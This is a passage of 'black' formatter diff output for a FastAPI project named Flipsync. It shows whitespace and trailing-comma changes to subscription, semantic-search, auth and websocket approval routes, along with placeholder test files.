                 "user_id": str(current_user.id),
                 "current_tier": current_tier,
                 "forecast_months": months,
                 "forecast": forecast,
-                "generated_at": datetime.now(timezone.utc).isoformat()
-            }
-        )
-        
+                "generated_at": datetime.now(timezone.utc).isoformat(),
+            },
+        )
+
     except HTTPException:
         raise
     except Exception as e:
         logger.error(f"Error getting billing forecast: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail=f"Billing forecast failed: {str(e)}"
+            detail=f"Billing forecast failed: {str(e)}",
         )
 
 
 @router.get("/analytics/feature-adoption")
 async def get_feature_adoption_metrics(
-    current_user: User = Depends(AuthService.get_current_user)
+    current_user: User = Depends(AuthService.get_current_user),
 ):
     """
     Get feature adoption metrics for a user.
-    
+
     This endpoint:
     - Shows adoption rates for each feature
     - Identifies growing vs declining feature usage
     - Provides insights into feature value
     - Helps optimize subscription tier selection
     """
     try:
         logger.info(f"Getting feature adoption metrics for user {current_user.id}")
-        
+
         # Get feature adoption metrics
         metrics = await usage_analytics_service.get_feature_adoption_metrics(
             user_id=str(current_user.id)
         )
-        
+
         return JSONResponse(
             status_code=status.HTTP_200_OK,
             content={
                 "success": True,
                 "metrics": metrics,
-                "generated_at": datetime.now(timezone.utc).isoformat()
-            }
-        )
-        
+                "generated_at": datetime.now(timezone.utc).isoformat(),
+            },
+        )
+
     except Exception as e:
         logger.error(f"Error getting feature adoption metrics: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail=f"Feature adoption metrics failed: {str(e)}"
+            detail=f"Feature adoption metrics failed: {str(e)}",
         )
 
 
 @router.get("/health")
 async def subscription_health_check():
     """
     Perform health check on subscription services.
-    
+
     This endpoint:
     - Tests subscription service availability
     - Validates analytics service functionality
     - Returns comprehensive health status
     - Available without authentication for monitoring
     """
     try:
         # Test subscription service
         plans = enhanced_subscription_service.get_subscription_plans()
         subscription_healthy = len(plans) > 0
-        
+
         # Test analytics service (basic functionality)
         analytics_healthy = True  # Simple check for now
-        
-        overall_health = "healthy" if subscription_healthy and analytics_healthy else "degraded"
-        
+
+        overall_health = (
+            "healthy" if subscription_healthy and analytics_healthy else "degraded"
+        )
+
         return JSONResponse(
             status_code=status.HTTP_200_OK,
             content={
                 "status": overall_health,
                 "subscription_service": {
                     "status": "healthy" if subscription_healthy else "unhealthy",
-                    "plans_available": len(plans) if subscription_healthy else 0
+                    "plans_available": len(plans) if subscription_healthy else 0,
                 },
                 "analytics_service": {
                     "status": "healthy" if analytics_healthy else "unhealthy"
                 },
-                "timestamp": datetime.now(timezone.utc).isoformat()
-            }
-        )
-        
+                "timestamp": datetime.now(timezone.utc).isoformat(),
+            },
+        )
+
     except Exception as e:
         logger.error(f"Subscription health check failed: {e}")
         return JSONResponse(
             status_code=status.HTTP_503_SERVICE_UNAVAILABLE,
             content={
                 "status": "unhealthy",
                 "error": str(e),
-                "timestamp": datetime.now(timezone.utc).isoformat()
-            }
-        )
+                "timestamp": datetime.now(timezone.utc).isoformat(),
+            },
+        )
would reformat /home/brend/Flipsync_Final/fs_agt_clean/api/routes/subscription/enhanced_subscription_routes.py
--- /home/brend/Flipsync_Final/fs_agt_clean/config/test_test_dynamic_config.py	2025-06-14 20:35:30.775706+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/config/test_test_dynamic_config.py	2025-06-19 04:03:46.461766+00:00
@@ -9,35 +9,37 @@
 from pathlib import Path
 
 # Add the parent directory to the path for imports
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
+
 class TestTestDynamicConfig:
     """Test class for test_dynamic_config."""
-    
+
     def test_import(self):
         """Test that the module can be imported."""
         # TODO: Add actual import test
         assert True
-    
+
     def test_configuration_functionality(self):
         """Test configuration specific functionality."""
         # TODO: Add configuration functionality tests
         assert True
-    
+
     def test_application_bootstrap_integration(self):
         """Test integration with application bootstrap."""
         # TODO: Add bootstrap integration tests
         assert True
-    
+
     def test_configuration_loading(self):
         """Test configuration loading if applicable."""
         # TODO: Add configuration tests
         assert True
-    
+
     def test_no_redundancy_compliance(self):
         """Verify no redundant implementations."""
         # TODO: Add redundancy compliance tests
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/config/test_test_dynamic_config.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/agent_coordination/__init__.py	2025-06-14 20:35:30.775706+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/agent_coordination/__init__.py	2025-06-19 04:03:46.488166+00:00
@@ -10,12 +10,12 @@
 
 # Alias for backward compatibility
 HierarchicalCoordinator = AgentOrchestrator
 
 __all__ = [
-    "AgentOrchestrator", 
+    "AgentOrchestrator",
     "ExecutionResult",
-    "OrchestratorState", 
+    "OrchestratorState",
     "Workflow",
     "WorkflowState",
-    "HierarchicalCoordinator"
+    "HierarchicalCoordinator",
 ]
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/agent_coordination/__init__.py
--- /home/brend/Flipsync_Final/fs_agt_clean/api/routes/vector/semantic_search_routes.py	2025-06-14 20:35:30.771697+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/api/routes/vector/semantic_search_routes.py	2025-06-19 04:03:46.535126+00:00
@@ -14,29 +14,37 @@
 from pydantic import BaseModel, Field
 
 from fs_agt_clean.core.auth.auth_service import AuthService
 from fs_agt_clean.database.models.user import User
 from fs_agt_clean.services.vector.embedding_service import embedding_service
-from fs_agt_clean.database.repositories.vector_repository import vector_embedding_repository
+from fs_agt_clean.database.repositories.vector_repository import (
+    vector_embedding_repository,
+)
 from fs_agt_clean.core.config.vector_config import vector_db_manager
 
 logger = logging.getLogger(__name__)
 
 # Initialize router
 router = APIRouter(prefix="/vector", tags=["semantic-search"])
 
 
 class SemanticSearchRequest(BaseModel):
     """Request model for semantic search."""
+
     query: str = Field(..., description="Search query text")
     limit: int = Field(default=10, ge=1, le=50, description="Maximum number of results")
-    score_threshold: float = Field(default=0.7, ge=0.0, le=1.0, description="Minimum similarity score")
-    filters: Optional[Dict[str, Any]] = Field(default=None, description="Optional search filters")
+    score_threshold: float = Field(
+        default=0.7, ge=0.0, le=1.0, description="Minimum similarity score"
+    )
+    filters: Optional[Dict[str, Any]] = Field(
+        default=None, description="Optional search filters"
+    )
 
 
 class ProductEmbeddingRequest(BaseModel):
     """Request model for product embedding."""
+
     product_name: str = Field(..., description="Product name")
     description: str = Field(default="", description="Product description")
     category: str = Field(..., description="Product category")
     condition: str = Field(default="used", description="Product condition")
     brand: Optional[str] = Field(default=None, description="Product brand")
@@ -45,348 +53,364 @@
     marketplace: str = Field(default="ebay", description="Target marketplace")
 
 
 class SemanticSearchResponse(BaseModel):
     """Response model for semantic search."""
+
     query: str
     results: List[Dict[str, Any]]
     total_results: int
     search_time_ms: float
     score_threshold: float
 
 
 class ProductEmbeddingResponse(BaseModel):
     """Response model for product embedding."""
+
     product_id: str
     embedding_id: str
     success: bool
     message: str
     vector_dimension: int
 
 
 class SimilarProductsResponse(BaseModel):
     """Response model for similar products."""
+
     product_id: str
     similar_products: List[Dict[str, Any]]
     total_found: int
     search_time_ms: float
 
 
 @router.post("/search", response_model=SemanticSearchResponse)
 async def semantic_search(
     request: SemanticSearchRequest,
-    current_user: User = Depends(AuthService.get_current_user)
+    current_user: User = Depends(AuthService.get_current_user),
 ):
     """
     Perform semantic search for products.
-    
+
     This endpoint:
     - Generates embeddings for the search query
     - Searches for semantically similar products
     - Returns ranked results with similarity scores
     - Supports filtering and result limiting
     """
     try:
         start_time = datetime.now()
-        
+
         logger.info(f"Semantic search for user {current_user.id}: {request.query}")
-        
+
         # Perform semantic search
         results = await embedding_service.search_similar_products(
             query_text=request.query,
             limit=request.limit,
             score_threshold=request.score_threshold,
-            filters=request.filters
-        )
-        
+            filters=request.filters,
+        )
+
         # Calculate search time
         search_time = (datetime.now() - start_time).total_seconds() * 1000
-        
+
         return SemanticSearchResponse(
             query=request.query,
             results=results,
             total_results=len(results),
             search_time_ms=round(search_time, 2),
-            score_threshold=request.score_threshold
-        )
-        
+            score_threshold=request.score_threshold,
+        )
+
     except Exception as e:
         logger.error(f"Error in semantic search: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail=f"Semantic search failed: {str(e)}"
+            detail=f"Semantic search failed: {str(e)}",
         )
 
 
 @router.post("/embed/product", response_model=ProductEmbeddingResponse)
 async def embed_product(
     request: ProductEmbeddingRequest,
-    current_user: User = Depends(AuthService.get_current_user)
+    current_user: User = Depends(AuthService.get_current_user),
 ):
     """
     Generate and store embedding for a product.
-    
+
     This endpoint:
     - Creates vector embedding for product data
     - Stores embedding in vector database
     - Returns embedding metadata and success status
     - Enables future semantic search and recommendations
     """
     try:
-        logger.info(f"Embedding product for user {current_user.id}: {request.product_name}")
-        
+        logger.info(
+            f"Embedding product for user {current_user.id}: {request.product_name}"
+        )
+
         # Generate unique product ID
         import uuid
+
         product_id = str(uuid.uuid4())
-        
+
         # Prepare product data
         product_data = {
             "name": request.product_name,
             "description": request.description,
             "category": request.category,
             "condition": request.condition,
             "brand": request.brand,
             "features": request.features or [],
             "price": request.price,
-            "marketplace": request.marketplace
+            "marketplace": request.marketplace,
         }
-        
+
         # Generate and store embedding
         success = await embedding_service.embed_product(
             product_id=product_id,
             product_data=product_data,
-            user_id=str(current_user.id)
-        )
-        
+            user_id=str(current_user.id),
+        )
+
         if success:
             # Get embedding stats for response
             stats = await embedding_service.get_embedding_stats()
             vector_dimension = 384  # Default local embedding dimension
-            
+
             return ProductEmbeddingResponse(
                 product_id=product_id,
                 embedding_id=f"emb_{product_id}",
                 success=True,
                 message="Product embedding created successfully",
-                vector_dimension=vector_dimension
+                vector_dimension=vector_dimension,
             )
         else:
             raise HTTPException(
                 status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-                detail="Failed to create product embedding"
-            )
-        
+                detail="Failed to create product embedding",
+            )
+
     except HTTPException:
         raise
     except Exception as e:
         logger.error(f"Error embedding product: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail=f"Product embedding failed: {str(e)}"
+            detail=f"Product embedding failed: {str(e)}",
         )
 
 
 @router.get("/similar/{product_id}", response_model=SimilarProductsResponse)
 async def get_similar_products(
     product_id: str,
-    limit: int = Query(default=10, ge=1, le=50, description="Maximum number of results"),
-    score_threshold: float = Query(default=0.7, ge=0.0, le=1.0, description="Minimum similarity score"),
-    current_user: User = Depends(AuthService.get_current_user)
+    limit: int = Query(
+        default=10, ge=1, le=50, description="Maximum number of results"
+    ),
+    score_threshold: float = Query(
+        default=0.7, ge=0.0, le=1.0, description="Minimum similarity score"
+    ),
+    current_user: User = Depends(AuthService.get_current_user),
 ):
     """
     Get products similar to a specific product.
-    
+
     This endpoint:
     - Retrieves the embedding for the specified product
     - Searches for similar products in the vector database
     - Returns ranked similar products with scores
     - Supports result limiting and score thresholds
     """
     try:
         start_time = datetime.now()
-        
-        logger.info(f"Finding similar products for user {current_user.id}: {product_id}")
-        
+
+        logger.info(
+            f"Finding similar products for user {current_user.id}: {product_id}"
+        )
+
         # Get product embedding
         embeddings = await vector_embedding_repository.get_embeddings_by_entity(
-            entity_id=product_id,
-            entity_type="product"
-        )
-        
+            entity_id=product_id, entity_type="product"
+        )
+
         if not embeddings:
             raise HTTPException(
                 status_code=status.HTTP_404_NOT_FOUND,
-                detail=f"Product embedding not found: {product_id}"
-            )
-        
+                detail=f"Product embedding not found: {product_id}",
+            )
+
         # Use the first embedding for similarity search
         product_embedding = embeddings[0]
-        
+
         # Search for similar embeddings
-        similar_embeddings = await vector_embedding_repository.search_similar_embeddings(
-            query_vector=product_embedding.vector,
-            entity_type="product",
-            limit=limit + 1,  # +1 to exclude the original product
-            score_threshold=score_threshold
-        )
-        
+        similar_embeddings = (
+            await vector_embedding_repository.search_similar_embeddings(
+                query_vector=product_embedding.vector,
+                entity_type="product",
+                limit=limit + 1,  # +1 to exclude the original product
+                score_threshold=score_threshold,
+            )
+        )
+
         # Format results (exclude the original product)
         similar_products = []
         for embedding, score in similar_embeddings:
             if embedding.entity_id != product_id:  # Exclude original product
-                similar_products.append({
-                    "product_id": embedding.entity_id,
-                    "similarity_score": score,
-                    "metadata": embedding.metadata,
-                    "created_at": embedding.created_at.isoformat() if embedding.created_at else None
-                })
-        
+                similar_products.append(
+                    {
+                        "product_id": embedding.entity_id,
+                        "similarity_score": score,
+                        "metadata": embedding.metadata,
+                        "created_at": (
+                            embedding.created_at.isoformat()
+                            if embedding.created_at
+                            else None
+                        ),
+                    }
+                )
+
         # Limit results
         similar_products = similar_products[:limit]
-        
+
         # Calculate search time
         search_time = (datetime.now() - start_time).total_seconds() * 1000
-        
+
         return SimilarProductsResponse(
             product_id=product_id,
             similar_products=similar_products,
             total_found=len(similar_products),
-            search_time_ms=round(search_time, 2)
-        )
-        
+            search_time_ms=round(search_time, 2),
+        )
+
     except HTTPException:
         raise
     except Exception as e:
         logger.error(f"Error finding similar products: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail=f"Similar products search failed: {str(e)}"
+            detail=f"Similar products search failed: {str(e)}",
         )
 
 
 @router.get("/stats")
-async def get_vector_stats(
-    current_user: User = Depends(AuthService.get_current_user)
-):
+async def get_vector_stats(current_user: User = Depends(AuthService.get_current_user)):
     """
     Get vector database statistics and health information.
-    
+
     This endpoint returns:
     - Vector database connection status
     - Collection statistics and health
     - Embedding service metrics
     - Performance information
     """
     try:
         # Get embedding service stats
         embedding_stats = await embedding_service.get_embedding_stats()
-        
+
         # Get vector database health
         vector_health = await vector_db_manager.health_check()
-        
+
         # Get collection stats
         collection_stats = await vector_embedding_repository.get_collection_stats()
-        
+
         return JSONResponse(
             status_code=status.HTTP_200_OK,
             content={
                 "success": True,
                 "embedding_service": embedding_stats,
                 "vector_database": vector_health,
                 "collections": collection_stats,
-                "retrieved_at": datetime.now(timezone.utc).isoformat()
-            }
-        )
-        
+                "retrieved_at": datetime.now(timezone.utc).isoformat(),
+            },
+        )
+
     except Exception as e:
         logger.error(f"Error retrieving vector stats: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail=f"Failed to retrieve vector statistics: {str(e)}"
+            detail=f"Failed to retrieve vector statistics: {str(e)}",
         )
 
 
 @router.delete("/embedding/{embedding_id}")
 async def delete_embedding(
-    embedding_id: str,
-    current_user: User = Depends(AuthService.get_current_user)
+    embedding_id: str, current_user: User = Depends(AuthService.get_current_user)
 ):
     """
     Delete a vector embedding.
-    
+
     This endpoint:
     - Removes the specified embedding from the vector database
     - Returns success status
     - Requires proper authentication
     """
     try:
         logger.info(f"Deleting embedding for user {current_user.id}: {embedding_id}")
-        
+
         # Delete embedding
         success = await vector_embedding_repository.delete_embedding(embedding_id)
-        
+
         if success:
             return JSONResponse(
                 status_code=status.HTTP_200_OK,
                 content={
                     "success": True,
                     "message": f"Embedding deleted successfully: {embedding_id}",
-                    "deleted_at": datetime.now(timezone.utc).isoformat()
-                }
+                    "deleted_at": datetime.now(timezone.utc).isoformat(),
+                },
             )
         else:
             raise HTTPException(
                 status_code=status.HTTP_404_NOT_FOUND,
-                detail=f"Embedding not found or could not be deleted: {embedding_id}"
-            )
-        
+                detail=f"Embedding not found or could not be deleted: {embedding_id}",
+            )
+
     except HTTPException:
         raise
     except Exception as e:
         logger.error(f"Error deleting embedding: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail=f"Failed to delete embedding: {str(e)}"
+            detail=f"Failed to delete embedding: {str(e)}",
         )
 
 
 @router.post("/health")
 async def vector_health_check():
     """
     Perform health check on vector database and services.
-    
+
     This endpoint:
     - Tests vector database connectivity
     - Validates collection health
     - Returns comprehensive health status
     - Available without authentication for monitoring
     """
     try:
         # Perform health checks
         vector_health = await vector_db_manager.health_check()
         embedding_stats = await embedding_service.get_embedding_stats()
-        
+
         # Determine overall health
         overall_health = "healthy"
         if not vector_health.get("connected", False):
             overall_health = "degraded"
-        
+
         return JSONResponse(
             status_code=status.HTTP_200_OK,
             content={
                 "status": overall_health,
                 "vector_database": vector_health,
                 "embedding_service": embedding_stats,
-                "timestamp": datetime.now(timezone.utc).isoformat()
-            }
-        )
-        
+                "timestamp": datetime.now(timezone.utc).isoformat(),
+            },
+        )
+
     except Exception as e:
         logger.error(f"Health check failed: {e}")
         return JSONResponse(
             status_code=status.HTTP_503_SERVICE_UNAVAILABLE,
             content={
                 "status": "unhealthy",
                 "error": str(e),
-                "timestamp": datetime.now(timezone.utc).isoformat()
-            }
-        )
+                "timestamp": datetime.now(timezone.utc).isoformat(),
+            },
+        )
would reformat /home/brend/Flipsync_Final/fs_agt_clean/api/routes/vector/semantic_search_routes.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/agent_coordination/test_decision_engine.py	2025-06-14 20:35:30.775706+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/agent_coordination/test_decision_engine.py	2025-06-19 04:03:46.544363+00:00
@@ -1,11 +1,11 @@
 """
 Agent Test module for agent_coordination_decision_engine
 
 This module contains agent-focused tests for the migrated agent_coordination_decision_engine component.
 Tier: 2
-Note: 
+Note:
 """
 
 import pytest
 import sys
 from pathlib import Path
@@ -13,10 +13,11 @@
 # Add the parent directory to the path for imports
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from decision_engine import *
+
 
 class TestDecisionEngineAgent:
     """Agent test class for decision_engine."""
 
     def test_import(self):
@@ -50,15 +51,16 @@
         assert True
 
     def test_primary_implementation_features(self):
         """Test features specific to PRIMARY implementation."""
         # TODO: Add tests for PRIMARY implementation features
-        # Note: 
+        # Note:
         assert True
 
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests for agents
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/agent_coordination/test_decision_engine.py
--- /home/brend/Flipsync_Final/fs_agt_clean/api/routes/auth.py	2025-06-16 18:22:18.834107+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/api/routes/auth.py	2025-06-19 04:03:46.544513+00:00
@@ -96,11 +96,13 @@
     # Fallback to creating a new one using the compatibility module
     logger.warning("Auth service not found in application state, creating a new one")
 
     try:
         # Import here to avoid circular imports
-        from fs_agt_clean.core.auth.compat import get_auth_service as get_auth_service_compat
+        from fs_agt_clean.core.auth.compat import (
+            get_auth_service as get_auth_service_compat,
+        )
 
         # Create auth service using compatibility module
         auth_service = asyncio.run(get_auth_service_compat())
 
         # Store in application state for future use
@@ -134,11 +136,13 @@
     # Fallback to creating a new one using the compatibility module
     logger.warning("DB Auth service not found in application state, creating a new one")
 
     try:
         # Import here to avoid circular imports
-        from fs_agt_clean.core.auth.compat import get_db_auth_service as get_db_auth_service_compat
+        from fs_agt_clean.core.auth.compat import (
+            get_db_auth_service as get_db_auth_service_compat,
+        )
 
         # Create db auth service using compatibility module
         db_auth_service = asyncio.run(get_db_auth_service_compat())
 
         # Store in application state for future use
@@ -187,66 +191,78 @@
 
 
 # Create OAuth2 scheme for token validation
 oauth2_scheme = OAuth2PasswordBearer(tokenUrl="api/v1/auth/token")
 
+
 # OPTIONS handlers for CORS preflight requests
 @router.options("/login")
 async def options_login():
     """Handle CORS preflight for login endpoint."""
     return {"message": "OK"}
 
+
 @router.options("/register")
 async def options_register():
     """Handle CORS preflight for register endpoint."""
     return {"message": "OK"}
 
+
 @router.options("/refresh")
 async def options_refresh():
     """Handle CORS preflight for refresh endpoint."""
     return {"message": "OK"}
 
+
 @router.options("/logout")
 async def options_logout():
     """Handle CORS preflight for logout endpoint."""
     return {"message": "OK"}
 
+
 @router.options("/verify")
 async def options_verify():
     """Handle CORS preflight for verify endpoint."""
     return {"message": "OK"}
 
+
 @router.options("/token")
 async def options_token():
     """Handle CORS preflight for token endpoint."""
     return {"message": "OK"}
+
 
 # OPTIONS handlers for CORS preflight requests
 @router.options("/login")
 async def options_login():
     """Handle CORS preflight for login endpoint."""
     return {"message": "OK"}
 
+
 @router.options("/register")
 async def options_register():
     """Handle CORS preflight for register endpoint."""
     return {"message": "OK"}
 
+
 @router.options("/refresh")
 async def options_refresh():
     """Handle CORS preflight for refresh endpoint."""
     return {"message": "OK"}
 
+
 @router.options("/logout")
 async def options_logout():
     """Handle CORS preflight for logout endpoint."""
     return {"message": "OK"}
 
+
 @router.options("/verify")
 async def options_verify():
     """Handle CORS preflight for verify endpoint."""
     return {"message": "OK"}
+
 
 @router.options("/token")
 async def options_token():
     """Handle CORS preflight for token endpoint."""
     return {"message": "OK"}
--- /home/brend/Flipsync_Final/fs_agt_clean/core/agent_coordination/test_orchestrator.py	2025-06-14 20:35:30.775706+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/agent_coordination/test_orchestrator.py	2025-06-19 04:03:46.564290+00:00
@@ -1,11 +1,11 @@
 """
 Agent Test module for agent_coordination_orchestrator
 
 This module contains agent-focused tests for the migrated agent_coordination_orchestrator component.
 Tier: 1
-Note: 
+Note:
 """
 
 import pytest
 import sys
 from pathlib import Path
@@ -13,10 +13,11 @@
 # Add the parent directory to the path for imports
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from orchestrator import *
+
 
 class TestOrchestratorAgent:
     """Agent test class for orchestrator."""
 
     def test_import(self):
@@ -50,15 +51,16 @@
         assert True
 
     def test_primary_implementation_features(self):
         """Test features specific to PRIMARY implementation."""
         # TODO: Add tests for PRIMARY implementation features
-        # Note: 
+        # Note:
         assert True
 
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests for agents
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/api/routes/auth.py
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/agent_coordination/test_orchestrator.py
--- /home/brend/Flipsync_Final/fs_agt_clean/api/routes/websocket/enhanced_websocket_routes.py	2025-06-14 20:35:30.771697+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/api/routes/websocket/enhanced_websocket_routes.py	2025-06-19 04:03:46.662193+00:00
@@ -12,52 +12,74 @@
 import json
 import logging
 from datetime import datetime, timezone
 from typing import Any, Dict, List, Optional
 
-from fastapi import APIRouter, Depends, HTTPException, Query, WebSocket, WebSocketDisconnect, status
+from fastapi import (
+    APIRouter,
+    Depends,
+    HTTPException,
+    Query,
+    WebSocket,
+    WebSocketDisconnect,
+    status,
+)
 from fastapi.responses import JSONResponse
 from pydantic import BaseModel, Field
 
 from fs_agt_clean.core.auth.auth_service import AuthService
 from fs_agt_clean.database.models.user import User
+
 # Note: Using basic WebSocket implementation instead of enhanced manager
 # from fs_agt_clean.core.websocket.enhanced_websocket_manager import (
 #     enhanced_websocket_manager, EventType, RoomType
 # )
 from fs_agt_clean.services.workflow.approval_workflow_service import (
-    approval_workflow_service, ApprovalType, ApprovalPriority
+    approval_workflow_service,
+    ApprovalType,
+    ApprovalPriority,
 )
 
 logger = logging.getLogger(__name__)
 
 # Initialize router
 router = APIRouter(prefix="/ws", tags=["enhanced-websocket"])
 
 
 class ApprovalRequestCreate(BaseModel):
     """Request model for creating approval requests."""
+
     approval_type: str = Field(..., description="Type of approval request")
     title: str = Field(..., description="Request title")
     description: str = Field(..., description="Request description")
     data: Dict[str, Any] = Field(..., description="Request data")
     approvers: List[str] = Field(..., description="List of approver user IDs")
     priority: str = Field(default="medium", description="Request priority")
-    timeout_minutes: int = Field(default=60, ge=1, le=1440, description="Timeout in minutes")
-    requires_all_approvers: bool = Field(default=False, description="Whether all approvers must approve")
+    timeout_minutes: int = Field(
+        default=60, ge=1, le=1440, description="Timeout in minutes"
+    )
+    requires_all_approvers: bool = Field(
+        default=False, description="Whether all approvers must approve"
+    )
 
 
 class ApprovalActionRequest(BaseModel):
     """Request model for approval actions."""
+
     action: str = Field(..., description="Action: approve or reject")
     comments: Optional[str] = Field(default=None, description="Action comments")
-    reason: Optional[str] = Field(default=None, description="Rejection reason (required for reject)")
-    metadata: Optional[Dict[str, Any]] = Field(default=None, description="Additional metadata")
+    reason: Optional[str] = Field(
+        default=None, description="Rejection reason (required for reject)"
+    )
+    metadata: Optional[Dict[str, Any]] = Field(
+        default=None, description="Additional metadata"
+    )
 
 
 class WebSocketMessage(BaseModel):
     """WebSocket message model."""
+
     type: str = Field(..., description="Message type")
     data: Dict[str, Any] = Field(..., description="Message data")
     target: Optional[str] = Field(default=None, description="Target user or room")
 
 
@@ -86,269 +108,273 @@
 
 
 @router.post("/approval/create")
 async def create_approval_request(
     request: ApprovalRequestCreate,
-    current_user: User = Depends(AuthService.get_current_user)
+    current_user: User = Depends(AuthService.get_current_user),
 ):
     """
     Create a new approval request with real-time notifications.
-    
+
     This endpoint:
     - Creates approval workflow request
     - Sends real-time notifications to approvers
     - Tracks approval progress and status
     - Handles timeout and escalation
     """
     try:
-        logger.info(f"Creating approval request for user {current_user.id}: {request.title}")
-        
+        logger.info(
+            f"Creating approval request for user {current_user.id}: {request.title}"
+        )
+
         # Validate approval type
         try:
             approval_type = ApprovalType(request.approval_type)
         except ValueError:
             raise HTTPException(
                 status_code=status.HTTP_400_BAD_REQUEST,
-                detail=f"Invalid approval type: {request.approval_type}"
-            )
-        
+                detail=f"Invalid approval type: {request.approval_type}",
+            )
+
         # Validate priority
         try:
             priority = ApprovalPriority(request.priority)
         except ValueError:
             raise HTTPException(
                 status_code=status.HTTP_400_BAD_REQUEST,
-                detail=f"Invalid priority: {request.priority}"
-            )
-        
+                detail=f"Invalid priority: {request.priority}",
+            )
+
         # Validate rejection reason for reject action
         if request.approval_type == "reject" and not request.description:
             raise HTTPException(
                 status_code=status.HTTP_400_BAD_REQUEST,
-                detail="Rejection reason is required for reject actions"
-            )
-        
+                detail="Rejection reason is required for reject actions",
+            )
+
         # Create approval request
         request_id = await approval_workflow_service.create_approval_request(
             requester_id=str(current_user.id),
             approval_type=approval_type,
             title=request.title,
             description=request.description,
             data=request.data,
             approvers=request.approvers,
             priority=priority,
             timeout_minutes=request.timeout_minutes,
-            requires_all_approvers=request.requires_all_approvers
-        )
-        
+            requires_all_approvers=request.requires_all_approvers,
+        )
+
         if not request_id:
             raise HTTPException(
                 status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-                detail="Failed to create approval request"
-            )
-        
+                detail="Failed to create approval request",
+            )
+
         return JSONResponse(
             status_code=status.HTTP_201_CREATED,
             content={
                 "success": True,
                 "request_id": request_id,
                 "message": "Approval request created successfully",
-                "created_at": datetime.now(timezone.utc).isoformat()
-            }
-        )
-        
+                "created_at": datetime.now(timezone.utc).isoformat(),
+            },
+        )
+
     except HTTPException:
         raise
     except Exception as e:
         logger.error(f"Error creating approval request: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail=f"Approval request creation failed: {str(e)}"
+            detail=f"Approval request creation failed: {str(e)}",
         )
 
 
 @router.post("/approval/{request_id}/action")
 async def handle_approval_action(
     request_id: str,
     action_request: ApprovalActionRequest,
-    current_user: User = Depends(AuthService.get_current_user)
+    current_user: User = Depends(AuthService.get_current_user),
 ):
     """
     Handle approval action (approve/reject) with real-time notifications.
-    
+
     This endpoint:
     - Processes approval or rejection actions
     - Sends real-time status updates
     - Handles workflow completion
     - Provides audit trail
     """
     try:
-        logger.info(f"Processing approval action for user {current_user.id}: {request_id}")
-        
+        logger.info(
+            f"Processing approval action for user {current_user.id}: {request_id}"
+        )
+
         # Validate action
         if action_request.action not in ["approve", "reject"]:
             raise HTTPException(
                 status_code=status.HTTP_400_BAD_REQUEST,
-                detail="Action must be 'approve' or 'reject'"
-            )
-        
+                detail="Action must be 'approve' or 'reject'",
+            )
+
         # Validate rejection reason
         if action_request.action == "reject" and not action_request.reason:
             raise HTTPException(
                 status_code=status.HTTP_400_BAD_REQUEST,
-                detail="Rejection reason is required for reject actions"
-            )
-        
+                detail="Rejection reason is required for reject actions",
+            )
+
         # Process action
         if action_request.action == "approve":
             success = await approval_workflow_service.approve_request(
                 request_id=request_id,
                 approver_id=str(current_user.id),
                 comments=action_request.comments,
-                metadata=action_request.metadata
+                metadata=action_request.metadata,
             )
         else:  # reject
             success = await approval_workflow_service.reject_request(
                 request_id=request_id,
                 approver_id=str(current_user.id),
                 reason=action_request.reason,
-                metadata=action_request.metadata
-            )
-        
+                metadata=action_request.metadata,
+            )
+
         if not success:
             raise HTTPException(
                 status_code=status.HTTP_400_BAD_REQUEST,
-                detail=f"Failed to {action_request.action} request"
-            )
-        
+                detail=f"Failed to {action_request.action} request",
+            )
+
         return JSONResponse(
             status_code=status.HTTP_200_OK,
             content={
                 "success": True,
                 "request_id": request_id,
                 "action": action_request.action,
                 "message": f"Request {action_request.action}d successfully",
-                "processed_at": datetime.now(timezone.utc).isoformat()
-            }
-        )
-        
+                "processed_at": datetime.now(timezone.utc).isoformat(),
+            },
+        )
+
     except HTTPException:
         raise
     except Exception as e:
         logger.error(f"Error processing approval action: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail=f"Approval action failed: {str(e)}"
+            detail=f"Approval action failed: {str(e)}",
         )
 
 
 @router.get("/approval/requests")
 async def get_approval_requests(
-    include_completed: bool = Query(default=False, description="Include completed requests"),
-    current_user: User = Depends(AuthService.get_current_user)
+    include_completed: bool = Query(
+        default=False, description="Include completed requests"
+    ),
+    current_user: User = Depends(AuthService.get_current_user),
 ):
     """
     Get approval requests for the current user.
-    
+
     This endpoint:
